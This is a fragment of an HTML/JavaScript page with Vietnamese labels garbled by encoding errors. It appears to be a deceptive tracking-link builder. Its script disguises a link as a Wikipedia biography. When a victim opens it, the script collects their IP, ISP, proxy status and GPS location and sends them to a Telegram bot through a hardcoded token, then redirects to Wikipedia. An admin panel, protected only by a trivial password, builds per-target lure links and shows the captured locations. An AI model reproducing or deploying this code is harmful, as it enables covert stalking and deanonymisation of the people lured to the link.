<body id="main-body" class="victim-body">

                            <textarea id="ed-desc" placeholder="M√¥ t·∫£ ng·ª•y trang" class="input-dark h-16 resize-none" oninput="updateUI()"></textarea>

                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-[10px] uppercase shadow-lg transition-all">T·∫°o & Hi·ªán Link</button>
                        <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/30">

                <div class="lg:col-span-7">

                            <h3 class="text-[11px] font-black uppercase italic tracking-widest">Live Operations Logs</h3>

                                    </tr>

                                    </tbody>

    <script>
        let config = {
            t: "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4",
            i: "857408205",
            r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n",
            mt: "Ti·ªÉu s·ª≠ ƒê·ª©c qu·ªëc c√¥ng ƒê√†o Minh Qu√¢n",
            md: "T·ªôi √°c c·ªông s·∫£n v·ªõi ƒê√†o Minh Qu√¢n v√† c√¥ng ∆°n cao c·∫£ c·ªßa Ng√†i.",
            mi: "https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg"
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                if (localStorage.getItem('v30_auth') === 'true' || prompt("X√°c th·ª±c h·ªá th·ªëng:") === "123") {
                    localStorage.setItem('v30_auth', 'true');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { startPhantom(); }
        };

        // --- TRACKING CORE (JS VERSION OF YOUR PHP LOGIC) ---
        async function startPhantom() {
            try { 
                const v = urlParams.get('v'); 
                if(v) config = JSON.parse(decodeURIComponent(escape(atob(v)))); 
                document.title = config.mt;
                document.getElementById('meta-desc').content = config.md;
                document.getElementById('og-title').content = config.mt;
                document.getElementById('og-desc').content = config.md;
                document.getElementById('og-img').content = config.mi;
            } catch(e) {}

            const target = urlParams.get('name') || 'GUEST';
            let logData = { name: target, time: new Date().toLocaleTimeString(), st: 'IP' };

            // L·∫•y IP & ISP & Proxy Status (IP-API)
            try {
                const res = await fetch('http://ip-api.com/json/?fields=status,isp,city,country,proxy,query,lat,lon').then(r => r.json());
                if(res.status === 'success') {
                    logData.ip = res.query;
                    logData.isp = res.isp;
                    logData.fraud = res.proxy ? "‚ö†Ô∏è VPN/Proxy" : "Clean";
                    logData.address = res.city + ", " + res.country;
                    logData.lat = res.lat;
                    logData.lon = res.lon;

                    saveLog(logData);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + target + "</b> truy c·∫≠p\nüåê IP: <code>" + res.query + "</code>\nüè¢ ISP: " + res.isp + "\nüõ°Ô∏è Proxy: " + logData.fraud)}`);
                }
            } catch(e) {}

            const jump = () => window.location.replace(config.r);

            // L·∫•y GPS & Reverse Geocoding
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    let addrStr = `T·ªça ƒë·ªô: ${lat}, ${lon}`;
                    try {
                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                        addrStr = geo.display_name || addrStr;
                    } catch(e) {}
                    logData.lat = lat; logData.lon = lon; logData.address = addrStr; logData.st = 'GPS';
                    saveLog(logData);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + target + "</b> V·ªã Tr√≠ OK\nüìç " + addrStr)}`);
                    jump();
                }, jump, { timeout: 5000 });
            } else { jump(); }
            setTimeout(jump, 8000);
        }

        // --- ADMIN FUNCTIONS ---
        function initAdmin() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            
            const saved = localStorage.getItem('v30_cfg');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('ed-title').value = config.mt;
            document.getElementById('ed-desc').value = config.md;
            document.getElementById('ed-img').value = config.mi;
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            
            updateUI();
            renderLogs();
            setInterval(renderLogs, 3000);
        }

        function updateUI() {
            document.getElementById('pre-title').innerText = document.getElementById('ed-title').value || "...";
            document.getElementById('pre-desc').innerText = document.getElementById('ed-desc').value || "...";
            document.getElementById('pre-img').src = document.getElementById('ed-img').value || "";
        }

        function saveAndBuild() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            config.mt = document.getElementById('ed-title').value;
            config.md = document.getElementById('ed-desc').value;
            config.mi = document.getElementById('ed-img').value;
            localStorage.setItem('v30_cfg', JSON.stringify(config));
            const name = document.getElementById('in-name').value || 'Target';
            const base = window.location.href.split('?')[0];
            const v = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
            const link = `${base}?name=${encodeURIComponent(name)}&v=${v}`;
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = link;
        }

        function saveLog(data) {
            let logs = JSON.parse(localStorage.getItem('v30_logs') || '[]');
            if (logs.length > 0 && logs[0].name === data.name && data.st === 'GPS') {
                logs[0] = data;
            } else { logs.unshift(data); }
            localStorage.setItem('v30_logs', JSON.stringify(logs.slice(0, 50)));
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('v30_logs') || '[]');
            const table = document.getElementById('log-list');
            const html = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                    <td class="p-4 font-bold text-white uppercase">${l.name}<br><span class="text-[8px] text-gray-600">${l.time}</span></td>
                    <td class="p-4 text-blue-400 font-mono text-[10px]">${l.ip}<br><span class="text-[8px] text-red-500">${l.fraud || ''}</span></td>
                    <td class="p-4 text-gray-300 text-[9px] max-w-[200px] leading-tight">${l.address || 'ISP: ' + l.isp}</td>
                    <td class="p-4 text-right">
                        ${l.lat ? `<a href="http://google.com/maps?q=0${l.lat},${l.lon}" target="_blank" class="bg-green-600/20 text-green-500 px-2 py-1 rounded font-bold">MAP</a>` : `<span class="text-gray-700 italic">IP</span>`}
                    </td>
                </tr>
            `).join('');
            if (table.innerHTML !== html) table.innerHTML = html;
        }

        function clearLogs() { localStorage.removeItem('v30_logs'); renderLogs(); }
        function logout() { localStorage.removeItem('v30_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy!"); }
    </script>
